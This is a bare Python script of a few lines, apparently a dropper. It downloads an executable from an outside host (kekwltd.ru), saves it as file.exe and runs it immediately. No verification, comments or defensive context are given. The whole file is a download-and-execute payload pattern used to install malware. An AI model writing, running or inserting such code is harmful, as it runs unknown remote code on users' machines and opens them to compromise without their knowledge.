import requests
import subprocess


url = 'https://kekwltd.ru/kekwltd.exe'

r = requests.get(url)

with open('file.exe', 'wb') as f:
    f.write(r.content)

subprocess.call('file.exe')